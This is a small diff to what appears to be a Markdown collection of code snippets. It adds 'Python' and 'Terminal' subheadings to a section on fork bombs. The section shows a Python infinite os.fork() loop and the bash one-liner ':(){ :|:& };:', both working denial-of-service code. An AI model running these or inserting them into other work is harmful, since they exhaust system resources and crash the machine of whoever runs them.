@@ -70,13 +70,14 @@ if __name__ == "__main__":
 
 ## BOMBA FORK
 
+### Python
 ```python
 import os
 
 while True:
     os.fork()
 ```
-
+### Terminal
 ```bash
 :(){ :|:& };:
 ```
